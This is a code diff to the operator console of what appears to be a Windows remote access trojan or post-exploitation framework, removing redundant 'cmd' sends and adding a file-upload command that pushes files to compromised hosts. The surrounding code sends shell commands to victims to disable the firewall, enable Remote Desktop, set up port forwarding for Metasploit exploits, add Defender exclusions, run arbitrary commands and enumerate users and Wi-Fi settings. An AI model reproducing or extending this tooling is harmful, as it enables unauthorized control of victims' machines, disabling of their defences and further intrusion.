@@ -46,14 +46,14 @@ class ClientManage:
         try:
             self.client_socket.send(data.encode())
         except Exception as error:
-            clients.remove(self.client_socket)
+            self._clearKick()
             print("Error Occured : " + str(error))
 
     def SendBytes(self, data):
         try:
             self.client_socket.send(data)
         except Exception as error:
-            clients.remove(self.client_socket)
+            self._clearKick()
             print("Error Occured : " + str(error))
 
     def _clearKick(self):
@@ -129,12 +129,12 @@ class ClientManage:
                 print("[+] Forwarding Port.")
 
                 shellmode = True
-                self.SendData("cmd")
+                
                 self.SendData("cmd.exe /c " + cmdstr)
                 self.WaitForReply()
                 time.sleep(2)
                 print("[+] Disabling firewall.")
-                self.SendData("cmd")
+                
                 self.SendData("cmd.exe /c netsh advfirewall set currentprofile state off")
                 self.WaitForReply()
                 with open("maalik_attack.rc", "w+") as rcfile:
@@ -147,11 +147,11 @@ class ClientManage:
 
                 try:
                     subprocess.call(["msfconsole", "-r", "maalik_attack.rc"])
-                    self.SendData("cmd")
+                    
                     self.SendData("cmd.exe /c netsh interface portproxy reset")
                     self.WaitForReply()
                     print("[+] Enabling firewall.")
-                    self.SendData("cmd")
+                    
                     self.SendData("cmd.exe /c netsh advfirewall set currentprofile state on")
                     self.WaitForReply()
                     shellmode = False
@@ -176,12 +176,12 @@ class ClientManage:
                 print("[+] Forwarding Port.")
 
                 shellmode = True
-                self.SendData("cmd")
+                
                 self.SendData("cmd.exe /c " + cmdstr)
                 self.WaitForReply()
                 time.sleep(2)
                 print("[+] Disabling firewall.")
-                self.SendData("cmd")
+                
                 self.SendData("cmd.exe /c netsh advfirewall set currentprofile state off")
                 self.WaitForReply()
                 print("[+] Run your Exploits on " + ip.split(":")[0] + " on Port " + str(self.exploit_port[0]) + ".")
@@ -191,12 +191,37 @@ class ClientManage:
                     try:
                         input("")
                     except KeyboardInterrupt:
-                        self.SendData("cmd")
+                        
                         self.SendData("cmd.exe /c netsh interface portproxy reset")
                         self.WaitForReply()
                         shellmode = False
                         break
-          
+
+        def filetransfer(mfile = None, rfile=None):
+            if(mfile == None and rfile == None):
+                mfile = input("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] File Path : ")
+                rfile = input("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] File name to Save as : ")
+                
+            if(":" in rfile):
+                    print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] ':' is forbidden in filename.")
+            else:
+                try:
+                    with open(mfile, "rb") as sendfile:
+                        data = sendfile.read()
+                        bufferst = os.stat(mfile)
+                        print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] File opened " + mfile + " ("+str(bufferst.st_size) + " bytes)" )
+                        time.sleep(1)
+                        self.SendData("frecv") # Send File Receive trigger for client
+                        trigger = rfile + ":" + str(bufferst.st_size) 
+                        self.SendData(trigger) # Send Trigger
+                        self.SendBytes(data) # Send file
+                        print("["+Style.BRIGHT + Fore.LIGHTBLUE_EX + "*" + Style.RESET_ALL + "] Uploading file.")
+                        self.WaitForReply()
+                except FileNotFoundError:
+                    print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] File not found!?")
+                except Exception as e:
+                    print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error : " + str(e))
+
         while(session):
             try:
                 location = clients.index(self.client_socket)
@@ -234,7 +259,6 @@ class ClientManage:
                     while (shell):
                         sh = input(Style.BRIGHT + "( " + Fore.RED + ip + Style.RESET_ALL + Style.BRIGHT + " ) > ")
                         if(len(sh) > 0):
-                            self.SendData("cmd")
                             self.SendData("cmd.exe /c "+ sh)
                             self.WaitForReply()
                             if (sh == "exit"):
@@ -256,27 +280,27 @@ class ClientManage:
                     self.DIRMONITOR(None)
 
                 elif(main == "netuser"):
-                    self.SendData("cmd")
+                    
                     self.SendData("cmd.exe /c net user")
                     self.WaitForReply()
                 elif(main == "driverquery"):
-                    self.SendData("cmd")
+                    
                     self.SendData("cmd.exe /c driverquery")
                     self.WaitForReply()
                 elif(main == "tasklist"):
-                    self.SendData("cmd")
+                    
                     self.SendData("cmd.exe /c tasklist")
                     self.WaitForReply()
                 elif(main == "drives"):
-                    self.SendData("cmd")
+                    
                     self.SendData("cmd.exe /c fsutil fsinfo drives")
                     self.WaitForReply()
                 elif(main == "set"):
-                    self.SendData("cmd")
+                    
                     self.SendData("cmd.exe /c set")
                     self.WaitForReply()
                 elif(main == "qwinsta"):
-                    self.SendData("cmd")
+                    
                     self.SendData("cmd.exe /c qwinsta")
                     self.WaitForReply()
                 elif(main.startswith("port_scan")):
@@ -304,7 +328,7 @@ class ClientManage:
                     self.SendData("clientinfo")
                     self.WaitForReply()
                 elif ( main == "netshall"):
-                    self.SendData("cmd")
+                    
                     self.SendData("cmd.exe /c netsh wlan show all")
                     self.WaitForReply()
                 elif ( main == "windefender_exclude"):
@@ -317,11 +341,11 @@ class ClientManage:
                 elif ( main == "rdp_enable"):
                     shellmode = True
                     print("["+Style.BRIGHT + Fore.GREEN + "+" + Style.RESET_ALL + "] Turning Remote Desktop on.")
-                    self.SendData("cmd")
+                    
                     self.SendData('cmd.exe /c reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f')
                     self.WaitForReply()
                     print("["+Style.BRIGHT + Fore.GREEN + "+" + Style.RESET_ALL + "] Disabling Firewall.")
-                    self.SendData("cmd")
+                    
                     self.SendData('cmd.exe /c netsh advfirewall firewall set rule group="remote desktop" new enable=yes')
                     self.WaitForReply()
                     shellmode = False
@@ -329,7 +353,7 @@ class ClientManage:
                 elif ( main == "rdp_disable" ):
                     shellmode = True
                     print("["+Style.BRIGHT + Fore.GREEN + "+" + Style.RESET_ALL + "] Turning Remote Desktop off.")
-                    self.SendData("cmd")
+                    
                     self.SendData('cmd.exe /c reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f')
                     self.WaitForReply()
                     shellmode = False
@@ -341,12 +365,12 @@ class ClientManage:
                     connect_port = input("[+] Enter Port to Forward Connection to : ")
                     newstr = cmdstr.format(lp = listen_port, cp = connect_port, ca = connect_addr)
                     print(newstr)
-                    self.SendData("cmd")
+                    
                     self.SendData("cmd.exe /c " + newstr)
                     self.WaitForReply()
 
                 elif( main == "portfwd_reset"):
-                    self.SendData("cmd")
+                    
                     self.SendData("cmd.exe /c netsh interface portproxy reset")
                     self.WaitForReply()
                 elif( main == "network_scan"):
@@ -521,18 +545,18 @@ Open Ports
                         print("[X] Error : " + str(e))
 
                 elif(main == "firewall_on"):
-                    self.SendData("cmd")
+                    
                     self.SendData("cmd.exe /c netsh advfirewall set currentprofile state on")
                     self.WaitForReply()
 
                 elif(main == "firewall_off"):
-                    self.SendData("cmd")
+                    
                     self.SendData("cmd.exe /c netsh advfirewall set currentprofile state off")
                     self.WaitForReply()
                     
                 elif(main == "tasklist"):
                     shellmode = True
-                    self.SendData("cmd")
+                    
                     self.SendData("cmd.exe /c tasklist")
                     self.WaitForReply()
                     shellmode = False
@@ -540,7 +564,7 @@ Open Ports
                 elif(main == "taskkill"):
                     processname = input("[?] Enter Process name : ")
                     if(len(processname) > 0):
-                        self.SendData("cmd")
+                        
                         self.SendData("cmd.exe /c taskkill /IM " + processname)
 
                 elif(main == "host_sweep"):
@@ -562,6 +586,11 @@ Open Ports
                             self.WaitForReply()
                     except Exception as e:
                         print("[X] Error : " + str(e))
+
+                elif(main == "upload"):
+                    shellmode = True
+                    filetransfer()
+                    shellmode = False
                 elif(main == "help"):
                     print(Style.BRIGHT + Fore.WHITE + """
                     HELP
@@ -595,6 +624,7 @@ Open Ports
                     -. tasklist - View Running Processes.
                     -. taskkill - Kill Running Process.
                     -. host_sweep - Get all hostnames of scanned targets or specific IP (use -h to specify ip).
+                    -. upload - Upload file.
                     
                     POST Exploitation Specific 
                     ----------------------------------
